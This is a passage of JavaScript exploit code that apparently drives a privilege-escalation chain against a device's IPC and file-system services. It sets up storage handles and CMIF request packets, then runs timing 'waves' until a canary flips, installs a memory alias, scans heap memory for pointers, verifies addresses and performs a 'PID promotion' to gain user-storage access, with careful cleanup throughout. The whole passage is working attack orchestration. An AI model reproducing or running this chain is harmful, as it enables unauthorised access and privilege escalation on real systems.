                attemptState.candidateCacheRetirementRequired)};
        const result = await performStopAndCleanup(cleanupOptions);
        recordCleanupState(attemptState, result, cleanupOptions.workerStateSafe,
            Boolean(cleanupOptions.candidateCacheNeedsRetirement ||
                cleanupOptions.addressCopy?.candidateCacheNeedsRetirement));
        return result;
    };

    try {

    // -- Phase 2: storage handles and clones ----------------------------

    const storageSetup = await openStorageAndClones({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });
    if (!storageSetup?.ok) {
        cleanupAttempted = true;
        await emitStage("Could not prepare storage access.");
        await emitVerboseStage(formatFailureSuffix(storageSetup));
        return;
    }
    handles = {...handles, ...storageSetup};

    const triggerSetup = await openTriggerHandles({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        savedHandle: handles.savedHandle,
        temporaryHandle: handles.temporaryHandle,
        handleResources: handles
    });
    if (!triggerSetup?.ok) {
        cleanupAttempted = true;
        await emitStage("Could not prepare file handles.");
        await emitVerboseStage(formatFailureSuffix(triggerSetup));
        return;
    }
    handles = {...handles, ...triggerSetup};

    await emitStage("File-system access and save data are ready.");

    // -- Phase 3: IPC requests and workers ------------------------------

    await emitStage("Preparing workers...");

    const buffers = allocatePacketBuffers({
        config, SCRATCH_DIR: scratch.SCRATCH_DIR,
        canaryPath: scratch.canaryPath
    });
    if (!buffers?.ok) {
        await emitStage("Could not prepare worker buffers.");
        return;
    }

    const packets = buildIpcRequests({
        config,
        canaryBufMem: buffers.canaryBufMem,
        canaryPath: scratch.canaryPath,
        fillerBuf0: buffers.fillerBuf0,
        fillerBuf1: buffers.fillerBuf1,
        fragmentBufs: buffers.fragmentBufs,
        guardBuf0: buffers.guardBuf0,
        guardBuf1: buffers.guardBuf1,
        triggerBuf: buffers.triggerBuf
    });
    if (!packets?.ok) {
        await emitStage("Could not prepare worker requests.");
        return;
    }

    const pathPair = await checkPathPair({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        fillerDst: buffers.fillerDst, fillerSrc: buffers.fillerSrc,
        guardPath: buffers.guardPath, guardPathC: buffers.guardPathC,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });
    if (!pathPair?.ok) {
        cleanupAttempted = true;
        await emitStage("Could not prepare auxiliary storage.");
        await emitVerboseStage(formatFailureSuffix(pathPair));
        return;
    }
    handles = {...handles, ...pathPair};

    const cmifSetup = applyCmifContexts({
        REQ: packets.REQ, clearPkt: packets.clearPkt,
        pinPkt: packets.pinPkt, prePkt: packets.prePkt
    });
    if (!cmifSetup?.ok) {
        await emitStage("Could not prepare worker requests.");
        return;
    }

    const waveInfrastructure = await prepareWaveInfrastructure({
        config, helpers, REQ: packets.REQ,
        clearPkt: packets.clearPkt, pinPkt: packets.pinPkt,
        prePkt: packets.prePkt, rootClones: handles.rootClones,
        saveClones: handles.saveClones,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        triggerBuf: buffers.triggerBuf,
        triggerHandle: handles.triggerHandle
    });
    if (!waveInfrastructure?.ok) {
        await emitStage("Could not start the workers.");
        return;
    }

    await emitStage("Workers are ready.");

    // -- Phase 4: canary attempt -----------------------------------------

    await emitStage("Checking the canary window...");
    cleanupWorkerStateSafe = false;

    const control = await runControlWaveLoop({
        config, helpers, REQ: packets.REQ,
        dirtyFilePath: scratch.dirtyFilePath,
        extentTriggerHandle: handles.extentTriggerHandle,
        gates: waveInfrastructure.gates,
        pinHandle: handles.pinHandle,
        pinPkt: packets.pinPkt, pktBuf: pktBuf,
        rawScheduling, rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        workerResources: waveInfrastructure.workerResources,
        SCRATCH_DIR: scratch.SCRATCH_DIR,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        extentTotal: buffers.extentTotal,
        fragmentBufs: buffers.fragmentBufs,
        prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        segments: scratch.segments,
        selectedDir: scratch.selectedDir,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
        triggerBuf: buffers.triggerBuf,
        timingBaseline,
        allowTimingAdjustments,
        shouldStop: () => timingPersistence?.stopRequested === true
    });

    cleanupWorkerStateSafe = control?.workerStateSafe === true;
    attemptState.stoppedByUser = control?.stoppedByUser === true;
    attemptState.positiveAttempts = control?.positiveAttempts || 0;
    attemptState.positiveWindows = control?.positiveWindows || 0;
    attemptState.timingAdjustments = control?.timingAdjustments || [];
    attemptState.canaryTimingSchedule = copyCanaryTimingSchedule(
        control?.timingSchedule) || attemptState.canaryTimingSchedule;
    const hasTimingAdjustment = Boolean(control?.timingAdjustments?.length);
    if (hasTimingAdjustment && timingPersistence) {
        timingPersistence.adjustedThisRun = true;
        timingPersistence.savedThisRun = false;
        timingPersistence.saveError = null;
    }
    let canaryStageMessage;
    if (control?.stoppedByUser) {
        canaryStageMessage = "Stopped by user after the current wave; no further waves will launch.";
    } else if (control?.canaryQualified) {
        canaryStageMessage = "CANARY FLIPPED";
    } else if (control?.positiveWindows) {
        canaryStageMessage = "Canary did not flip.";
        if (hasTimingAdjustment) {
            canaryStageMessage +=
                " Timing will be adjusted for the next attempt.";
        }
    } else {
        canaryStageMessage = "No valid canary window was found.";
        if (hasTimingAdjustment) {
            canaryStageMessage +=
                " Timing will be adjusted for the next attempt.";
        }
    }

    await emitStage(canaryStageMessage);
    await emitVerboseStage(formatCanaryResult(control, config));
    handles = {...handles, pinHandle: control?.pinHandle || handles.pinHandle};

    if (control?.stoppedByUser) {
        await stopAndCleanup({
            reason: "Stopped by user after the current wave; skipping later phases.",
            scratch, handles, helpers,
            workerStateSafe: control?.workerStateSafe === true
        });
        return;
    }

    if (!control?.ok) {
        await stopAndCleanup({
            reason: "Canary attempt stopped before qualification; " +
                "skipping later phases.",
            scratch, handles, helpers,
            workerStateSafe: control?.workerStateSafe === true
        });
        return;
    }

    if (control.canaryQualified !== true) {
        await stopAndCleanup({
            reason: "Canary did not flip; skipping candidate storage, " +
                "cache alias, heap scan, address qualification and promotion.",
            scratch, handles, helpers,
            workerStateSafe: control.workerStateSafe
        });
        return;
    }

    // -- Phase 5: candidate storage -------------------------------------

    await emitStage("Preparing candidate storage...");

    const candidateSetup = await preparePostCanaryCandidate({
        config, helpers, canaryQualified: control.canaryQualified,
        pktBuf: pktBuf,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        workerStateSafe: control.workerStateSafe
    });

    if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
        !candidateSetup?.failureReason) {
        await emitStage("CANDIDATE STORAGE IS READY");
    } else if (candidateSetup?.candidateHandle && candidateSetup?.primeHex) {
        await emitStage("Candidate storage verification failed.");
    } else {
        await emitStage("Candidate storage is unavailable.");
    }
    await emitVerboseStage("Candidate storage: " +
        (candidateSetup?.failureReason || "verified"));

    handles = {...handles, candidateHandle: candidateSetup?.candidateHandle || 0};

    if (!candidateSetup?.ok || candidateSetup.canaryQualified !== true ||
        !candidateSetup.candidateHandle || !candidateSetup.primeHex ||
        candidateSetup.failureReason) {
        await stopAndCleanup({
            reason: "Candidate storage is not fully qualified; " +
                "skipping cache alias and later phases.",
            scratch, handles, helpers,
            workerStateSafe: control.workerStateSafe
        });
        return;
    }

    // -- Phase 6: cache alias -------------------------------------------

    await emitStage("Installing the memory alias...");
    const aliasStartedAt = Date.now();
    cleanupWorkerStateSafe = false;
    attemptState.candidateCacheRetirementRequired = true;
    attemptState.cacheRetirementVerified = false;

    const alias = await installCacheAlias({
        config, helpers, REQ: packets.REQ,
        canaryQualified: candidateSetup.canaryQualified,
        candidateHandle: candidateSetup.candidateHandle,
        dirtyFilePath: scratch.dirtyFilePath,
        dirtyWriteBuf: control.dirtyWriteBuf,
        dirtyWritePkt: control.dirtyWritePkt,
        gates: waveInfrastructure.gates, pinPkt: packets.pinPkt,
        pktBuf: pktBuf, primeHex: candidateSetup.primeHex,
        rawScheduling, rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        wavesJoined: control.wavesJoined,
        wavesStarted: control.wavesStarted,
        workerResources: waveInfrastructure.workerResources,
        workerStateSafe: control.workerStateSafe,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        fragmentBufs: buffers.fragmentBufs,
        pinFirstWaveQualified: control.pinFirstWaveQualified,
        pinHandle: control.pinHandle,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
        triggerBuf: buffers.triggerBuf,
        reportProgress: emitStage,
        shouldStop: () => timingPersistence?.stopRequested === true
    });

    cleanupWorkerStateSafe = alias?.workerStateSafe === true;
    const aliasElapsedMs = Date.now() - aliasStartedAt;
    await emitStage(alias?.aliasInstalled
        ? "MEMORY ALIAS INSTALLED"
        : alias?.copyStepsCompleted
            ? "Memory alias installation is incomplete."
            : "Memory alias could not be installed.");
    await emitVerboseStage(formatAliasResult(alias) +
        formatAliasTiming(alias, aliasElapsedMs));

    const analysisResources = {
        config, REQ: packets.REQ,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        gates: waveInfrastructure.gates,
        pinFirstWaveQualified: control.pinFirstWaveQualified,
        pinHandle: control.pinHandle, pinPkt: packets.pinPkt,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        pktBuf: pktBuf, prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        rootSession: handles.rootSession,
        sendIndices: waveInfrastructure.sendIndices,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        savedHandle: handles.savedHandle,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt
    };

    addressCopy = {
        config, REQ: packets.REQ,
        candidateCacheNeedsRetirement:
            Boolean(alias?.candidateCacheNeedsRetirement),
        primeHex: candidateSetup.primeHex,
        aliasControlHex: candidateSetup.aliasControlHex,
        copyWavesTotal: alias?.copyWavesTotal || 0,
        dirtyFilePath: scratch.dirtyFilePath,
        dirtyWriteBuf: control.dirtyWriteBuf,
        dirtyWritePkt: control.dirtyWritePkt,
        gates: waveInfrastructure.gates, pinPkt: packets.pinPkt,
        pktBuf: pktBuf, rawScheduling,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        wavesJoined: alias?.wavesJoined || 0,
        wavesStarted: alias?.wavesStarted || 0,
        workerResources: waveInfrastructure.workerResources,
        workerStateSafe: alias?.workerStateSafe === true,
        fragmentBufs: buffers.fragmentBufs,
        triggerBuf: buffers.triggerBuf,
        analysis: analysisResources
    };

    if (alias?.stoppedByUser || timingPersistence?.stopRequested) {
        attemptState.stoppedByUser = true;
        await stopAndCleanup({
            reason: "Stopped by user during memory alias after the current wave; " +
                "remaining copy steps were skipped.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias?.candidateCacheNeedsRetirement),
            workerStateSafe: alias?.workerStateSafe === true
        });
        return;
    }

    if (!alias?.ok || !alias.aliasInstalled) {
        await stopAndCleanup({
            reason: "Cache alias installation was incomplete; " +
                "skipping memory search and address qualification.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias?.candidateCacheNeedsRetirement),
            workerStateSafe: alias?.workerStateSafe === true
        });
        return;
    }

    // -- Phase 7: heap neighbors and pointer scan -----------------------

    await emitStage("Preparing memory search...");

    const releaseSetup = await prepareReleaseNeighbors({
        aliasInstalled: alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        config, copyStepsCompleted: alias.copyStepsCompleted,
        rootSession: handles.rootSession
    });

    if (!releaseSetup?.ok) {
        await emitStage("Could not prepare memory search.");
        await stopAndCleanup({
            reason: "Neighbor storage setup failed; " +
                "skipping heap and address scans.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    handles = {...handles, extraStorages: releaseSetup.extraStorages || []};

    if (releaseSetup.eligible) {
        await emitStage("Memory search is ready.");
        await emitVerboseStage(releaseSetup.extraStorages.length + "/" +
            releaseSetup.expectedStorages + " storages prepared (attempted=" +
            releaseSetup.attemptedStorages + "; stopped=" +
            (releaseSetup.failureReason || "no") + ").");
    } else {
        await emitStage("Memory search is unavailable.");
        await stopAndCleanup({
            reason: "Neighbor scan is ineligible; skipping heap snapshot, " +
                "pointer search, address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    // Heap baseline capture and pointer scan
    let baseline = null;
    let release = {
        ok: true, extraStorages: releaseSetup.extraStorages,
        pointerCandidates: [], releaseRounds: 0, totalChangedLinks: 0,
        stopReason: releaseSetup.eligible ? "baseline-not-run" : "scan-ineligible"
    };

    if (releaseSetup.eligible) {
        await emitStage("Capturing a memory snapshot...");
        baseline = await captureReleaseBaseline({
            config, candidateHandle: handles.candidateHandle,
            primeHex: candidateSetup.primeHex, helpers
        });

        if (baseline?.snapshotOk) {
            await emitStage("Memory snapshot captured.");
        } else {
            await emitStage("Memory snapshot could not be verified.");
            await emitVerboseStage("Snapshot details: read=" +
                formatCode(baseline?.readError) + "; prefixMatched=" +
                Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                (baseline?.prevEnd || 0) + ").");
        }

        await emitStage("Searching memory for candidates...");
        release = await releaseNeighborsAndFindPointers({
            config, candidateHandle: handles.candidateHandle,
            primeHex: candidateSetup.primeHex,
            extraStorages: releaseSetup.extraStorages,
            baseline, helpers
        });

        if (!release?.ok) {
            await emitStage("Memory search failed.");
            await emitVerboseStage("Memory search stopped: " +
                (release?.stopReason || "unknown") + ".");
        } else if (release.stopReason === "baseline-not-qualified") {
            await emitStage("Memory search skipped because the snapshot was not verified.");
        } else if (release.pointerCandidates.length) {
            await emitStage("Memory candidates found.");
            await emitVerboseStage(release.pointerCandidates.length +
                " candidates found across " + release.releaseRounds +
                " rounds (changed links=" + release.totalChangedLinks +").");
        } else {
            await emitStage("No memory candidates were found.");
            await emitVerboseStage("Memory search details: rounds=" +
                release.releaseRounds + "; changed links=" +
                release.totalChangedLinks + "; stopped=" +
                (release.stopReason || "no") + "; read error=" +
                (release.readError == null ? "none" : formatCode(release.readError)) + ".");
        }
    } else {
        await emitStage("Memory search was skipped.");
    }

    handles = {...handles,
        extraStorages: release?.extraStorages || releaseSetup.extraStorages || []};

    if (!release?.ok) {
        await stopAndCleanup({
            reason: "Pointer scan failed; skipping address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    if (!release.pointerCandidates?.length) {
        await stopAndCleanup({
            reason: "No qualified pointer candidates; " +
                "skipping address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    // -- Phase 8: address qualification ---------------------------------

    await emitStage("Verifying the memory address...");
    const addressStartedAt = Date.now();
    cleanupWorkerStateSafe = false;

    const address = await qualifyAddressPlan({
        config, helpers, addressCopy,
        aliasInstalled: alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        collectTimingProfile: true,
        reportProgress: reportAddressProgress,
        shouldStop: () => timingPersistence?.stopRequested === true,
        pointerCandidates: release.pointerCandidates,
        primeHex: candidateSetup.primeHex,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle
    });

    cleanupWorkerStateSafe = address?.addressCopy?.workerStateSafe === true;
    const addressElapsedMs = Date.now() - addressStartedAt;

    const addressReadyForPromotion = Boolean(
        address?.ok && address.addressReadVerified &&
        address.rootStageVerified && address.verifiedIdentityTargets &&
        address.addressPlan && address.domainSession);
    if (addressReadyForPromotion) {
        await emitStage("MEMORY ADDRESS VERIFIED");
    } else {
        const missingChecks = [];
        if (!address?.ok) missingChecks.push("qualification result");
        if (!address?.addressReadVerified) missingChecks.push("address read");
        if (!address?.rootStageVerified) missingChecks.push("root identity");
        if (!address?.verifiedIdentityTargets)
            missingChecks.push("identity targets");
        if (!address?.addressPlan) missingChecks.push("address plan");
        if (!address?.domainSession) missingChecks.push("domain session");

        const reason = address?.addressFailureReason
            ? address.addressFailureReason.replace(/-/g, " ")
            : "required checks did not pass";
        const detail = typeof address?.addressFailureDetail === "string"
            ? address.addressFailureDetail.slice(0, 160) : "";
        await emitStage("Memory address not ready for promotion: " + reason +
            "; missing=" + missingChecks.join(", ") +
            (detail ? "; detail=" + detail : "") + ".");
    }
    for (const message of formatAddressResults(address, addressElapsedMs))
        await emitVerboseStage(message);

    handles = {...handles, domainSession: address.domainSession};
    addressCopy = address?.addressCopy || addressCopy;

    if (timingPersistence?.stopRequested) {
        attemptState.stoppedByUser = true;
        await stopAndCleanup({
            reason: "Stopped by user during address qualification after the " +
                "current wave; remaining scans were skipped.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(addressCopy?.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy?.workerStateSafe === true,
            domainSession: address.domainSession
        });
        return;
    }

    if (!addressReadyForPromotion) {
        await stopAndCleanup({
            reason: "Address or root identity was not fully verified; " +
                "PID promotion was skipped.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(addressCopy?.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy?.workerStateSafe === true,
            domainSession: address.domainSession
        });
        return;
    }

    // -- Phase 9: PID promotion -----------------------------------------

    await emitStage("Checking access to user storage...");
    cleanupWorkerStateSafe = false;

    const promotion = await runPromotionStep({
        config, addressPlan: address.addressPlan,
        addressCopy: address.addressCopy,
        addressReadVerified: address.addressReadVerified,
        candidateHandle: handles.candidateHandle,
        domainSession: handles.domainSession,
        helpers, rootStageVerified: address.rootStageVerified,
        verifiedIdentityTargets: address.verifiedIdentityTargets,
        workerStateSafe: address.addressCopy.workerStateSafe
    });

    cleanupWorkerStateSafe = promotion?.workerStateSafe === true;
    addressCopy = promotion?.addressCopy || address.addressCopy;
    const promotionOutcome = promotion?.promotionOutcome || {};

    attemptState.permissionProven = Boolean(
        promotion?.promotionAttempted &&
        promotionOutcome.promoted === true &&
        promotionOutcome.openedUserFs === true &&
        promotionOutcome.listedUserRoot === true &&
        promotionOutcome.listTransport === 0 &&
        promotionOutcome.listResult === 0);
    attemptState.pidPromotionVerified = promotionOutcome.promoted === true;
    attemptState.promotionTestHandlesClosed = Boolean(
        promotionOutcome.contentFsHandleClosed !== false &&
        promotionOutcome.contentFsDomainObjectClosed !== false);
    attemptState.promotionRestored = promotion?.promotionRestored === true;

    await emitStage(attemptState.permissionProven
        ? "USER STORAGE ACCESS VERIFIED"
        : "User storage access was not verified.");
    await emitVerboseStage(formatPromotionResult(promotion, address, handles));

    if (promotionOutcome.promotionRetained) {
        await beginCleanupLog(attemptState);
        cleanupAttempted = true;
        const lightCleanup = await cleanupScratchAndHandles({
            SCRATCH_DIR: scratch.SCRATCH_DIR,
            auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
            candidateCacheNeedsRetirement: false,
            candidateCacheRetired: false,
            candidateHandle: handles.candidateHandle,
            retainedEndpointActive: true,
            domainSession: handles.domainSession,
            keepDomainSessionOpen: true,
            extentTriggerHandle: handles.extentTriggerHandle,
            extraStorages: handles.extraStorages,
            pinHandle: handles.pinHandle,
            rootClones: handles.rootClones,
            rootSession: handles.rootSession,
            saveClones: handles.saveClones,
            savedHandle: handles.savedHandle,
            storageHandle: handles.storageHandle,
            temporaryHandle: 0,
            triggerHandle: handles.triggerHandle,
            workerStateSafe: promotion.workerStateSafe
        });

        attemptState.promotionRetained = true;
        attemptState.retainedEndpointActive = true;
        attemptState.workersQuiesced = promotion.workerStateSafe === true;
        attemptState.lightCleanupVerified = Boolean(
            lightCleanup.cleanupVerified &&
            promotionOutcome.contentFsHandleClosed !== false &&
            promotionOutcome.contentFsDomainObjectClosed !== false);
        attemptState.workerStateSafe = lightCleanup.workerStateSafe;
        attemptState.primaryCleanupAttempted = lightCleanup.attempted === true;
        attemptState.primaryCommitVerified =
            lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
        attemptState.primaryScratchCleanupVerified =
            lightCleanup.attempted === true &&
            lightCleanup.deleteTransport === 0 && lightCleanup.deleteResult === 0 &&
            lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
        attemptState.primaryHandlesClosed = Boolean(
            lightCleanup.attempted === true &&
            lightCleanup.handlesClosed === lightCleanup.expectedHandles &&
            (lightCleanup.closeErrors || []).length === 0);
        attemptState.cleanupSummary =
            "fspSrv and candidate storage intentionally retained";
        cleanupWorkerStateSafe = lightCleanup.workerStateSafe;
        await emitVerboseStage(formatCleanupResult(lightCleanup,
            lightCleanup.workerStateSafe));
        return;
    }

    // -- Phase 10: endpoint retirement and final cleanup ----------------

    await beginCleanupLog(attemptState);
    cleanupWorkerStateSafe = false;
    attemptState.workersQuiesced = false;

    const retired = await retireCandidateCacheAndClose({
        helpers, addressCopy: promotion.addressCopy || address.addressCopy,
        candidateCacheNeedsRetirement:
            Boolean(attemptState.candidateCacheRetirementRequired ||
                (promotion.addressCopy || address.addressCopy)
                    .candidateCacheNeedsRetirement),
        candidateHandle: handles.candidateHandle,
        retireRetainedEndpoint: promotion.retireRetainedEndpoint,
        workerStateSafe: promotion.workerStateSafe
    });

    attemptState.workersQuiesced = retired?.workersQuiesced === true;
    attemptState.retainedEndpointActive = Boolean(
        retired?.addressCopy?.retainedEndpointActive);

    cleanupWorkerStateSafe = retired?.workerStateSafe === true;
    addressCopy = retired?.addressCopy || addressCopy;
    await emitVerboseStage(formatRetirementResult(retired));
    handles = {...handles, candidateHandle: retired.candidateHandle};

    cleanupAttempted = true;

    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: scratch.SCRATCH_DIR,
        auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
        candidateHandle: handles.candidateHandle,
        candidateCacheNeedsRetirement:
            Boolean(attemptState.candidateCacheRetirementRequired ||
                retired.addressCopy.candidateCacheNeedsRetirement),
        candidateCacheRetired: retired.candidateCacheRetired,
        retainedEndpointActive: retired.addressCopy.retainedEndpointActive,
        domainSession: handles.domainSession,
        extentTriggerHandle: handles.extentTriggerHandle,
        extraStorages: handles.extraStorages,
        pinHandle: handles.pinHandle,
        rootClones: handles.rootClones,
        rootSession: handles.rootSession,
        saveClones: handles.saveClones,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle,
        temporaryHandle: 0,
        triggerHandle: handles.triggerHandle,
        workerStateSafe: retired.workerStateSafe
    });

    await emitVerboseStage(formatCleanupResult(cleanup, retired.workerStateSafe));
    recordCleanupState(attemptState, {retired, cleanup},
        retired.workerStateSafe,
        Boolean(retired.addressCopy?.candidateCacheNeedsRetirement));

    } finally {
        if (!cleanupAttempted) {
            await stopAndCleanup({
                reason: "Workflow exited before its planned cleanup; " +
                    "attempting guarded cleanup.",
                scratch, handles, helpers, addressCopy,
                candidateCacheNeedsRetirement:
                    Boolean(addressCopy?.candidateCacheNeedsRetirement),
                workerStateSafe: cleanupWorkerStateSafe,
                domainSession: handles?.domainSession || null
            });
        }
    }
}


// ---------------------------------------------------------------------------
// Stop-and-cleanup orchestration
// ---------------------------------------------------------------------------

async function performStopAndCleanup({
    reason, scratch, handles, helpers,
    addressCopy = null,
    candidateCacheNeedsRetirement = false,
    workerStateSafe = true,
    domainSession = null
}) {
    await emitVerboseStage("Stopping reason: " + reason);

    // Retire the candidate cache if a handle is still open
    let retired = {
        addressCopy,
        candidateHandle: handles?.candidateHandle || 0,
        candidateCacheRetired: Boolean(addressCopy?.candidateCacheRetired),
        workerStateSafe: Boolean(workerStateSafe),
        workersQuiesced: Boolean(workerStateSafe)
    };

    if (retired.candidateHandle) {
        retired = await retireCandidateCacheAndClose({
            helpers, addressCopy,
            candidateCacheNeedsRetirement:
                candidateCacheNeedsRetirement ||
                Boolean(addressCopy?.candidateCacheNeedsRetirement),
            candidateHandle: retired.candidateHandle,
            retireRetainedEndpoint: null,
            workerStateSafe: Boolean(workerStateSafe)
        });
        await emitVerboseStage(formatRetirementResult(retired));
    }

    // Delete save:/hole and close remaining handles
    const finalAddressCopy = retired.addressCopy || addressCopy || {};
    const finalWorkerStateSafe = Boolean(
        retired.workerStateSafe ?? workerStateSafe);

    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: scratch?.SCRATCH_DIR,
        auxiliaryStorageHandle: handles?.auxiliaryStorageHandle || 0,
        candidateHandle: retired.candidateHandle || 0,
        candidateCacheNeedsRetirement: candidateCacheNeedsRetirement ||
            Boolean(finalAddressCopy.candidateCacheNeedsRetirement),
        candidateCacheRetired: Boolean(retired.candidateCacheRetired ||
            finalAddressCopy.candidateCacheRetired),
        retainedEndpointActive: Boolean(finalAddressCopy.retainedEndpointActive),
        domainSession: domainSession || handles?.domainSession || null,
        extentTriggerHandle: handles?.extentTriggerHandle || 0,
        extraStorages: handles?.extraStorages || [],
        pinHandle: handles?.pinHandle || 0,
        rootClones: handles?.rootClones || [],
        rootSession: handles?.rootSession || 0,
        saveClones: handles?.saveClones || [],
        savedHandle: handles?.savedHandle || 0,
        storageHandle: handles?.storageHandle || 0,
        temporaryHandle: handles?.preserveTemporaryHandleForCleanup
            ? 0 : handles?.temporaryHandle || 0,
        triggerHandle: handles?.triggerHandle || 0,
        workerStateSafe: finalWorkerStateSafe
    });

    await emitVerboseStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
    return {retired, cleanup};
}

function recordCleanupState(attemptState, result, workerStateSafe,
    candidateCacheNeedsRetirement) {
    const retired = result?.retired;
    const cleanup = result?.cleanup;

    const retirementVerified = Boolean(retired && retired.ok !== false &&
        !retired.failureReason && retired.candidateHandle === 0 &&
        (!candidateCacheNeedsRetirement || retired.candidateCacheRetired ||
            retired.addressCopy?.candidateCacheRetired));
    candidateCacheNeedsRetirement = Boolean(candidateCacheNeedsRetirement ||
        attemptState.candidateCacheRetirementRequired);
    const cacheRetirementVerified = Boolean(!candidateCacheNeedsRetirement ||
        retired?.candidateCacheRetired ||
        retired?.addressCopy?.candidateCacheRetired);

    attemptState.primaryCleanupAttempted = cleanup?.attempted === true;
    attemptState.primaryCommitVerified =
        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
    attemptState.primaryScratchCleanupVerified =
        cleanup?.attempted === true &&
        cleanup?.deleteTransport === 0 && cleanup?.deleteResult === 0 &&
        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
    attemptState.primaryHandlesClosed = Boolean(
        cleanup?.attempted === true &&
        cleanup.handlesClosed === cleanup.expectedHandles &&
        (cleanup.closeErrors || []).length === 0);
    attemptState.endpointRetirementVerified = retirementVerified;
    attemptState.cacheRetirementVerified = cacheRetirementVerified;
    attemptState.candidateCacheRetirementRequired =
        candidateCacheNeedsRetirement;
    attemptState.retainedEndpointActive = Boolean(
        retired?.addressCopy?.retainedEndpointActive);
    attemptState.workersQuiesced = Boolean(
        retired?.workersQuiesced ?? workerStateSafe);

    attemptState.workerStateSafe = Boolean(
        workerStateSafe === true &&
        retired?.workerStateSafe === true &&
        cleanup?.workerStateSafe === true);
    attemptState.cleanupVerified = Boolean(retirementVerified &&
        cleanup?.cleanupVerified === true && attemptState.workerStateSafe);

    attemptState.safeToRetry = false;
    attemptState.cleanupSummary = attemptState.cleanupVerified
        ? "cache state verified safe, save scratch deleted and committed, all handles closed"
        : "cleanup not fully verified";
}


// ---------------------------------------------------------------------------
// IPC helper
// ---------------------------------------------------------------------------

function readEntryTypeChecked(handle, path) {
    const pathBuf = allocPage(0x1000);
    const packet = allocPage(0x2000);

    writeStr(pathBuf, path);
    prepPacket(packet, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(packet, 8, pathBuf, path.length + 1);
    write32(packet + 0x10n, 0x49434653n);
    write32(packet + 0x18n, 7n);

    const transport = Number(sendIPC(handle, packet)) >>> 0;
    if (transport !== 0)
        return {transport, result: null, type: null};

    const reply = cmifReply(packet);
    return {
        transport,
        result: reply.result,
        type: reply.result === 0
            ? Number(read32(packet + BigInt(reply.data))) >>> 0
            : null
    };
}


// ---------------------------------------------------------------------------
// Independent /hole cleanup (fallback path)
// ---------------------------------------------------------------------------

async function runHoleCleanupHandler(attemptState) {
    const handle = attemptState.holeCleanupHandle;
    if (!handle) {
        attemptState.holeAbsentVerified = false;
        attemptState.holeCleanupVerified = false;
        await emitVerboseStage(
            "HOLE FALLBACK: no independent save handle; " +
            "absence cannot be verified.");
        return false;
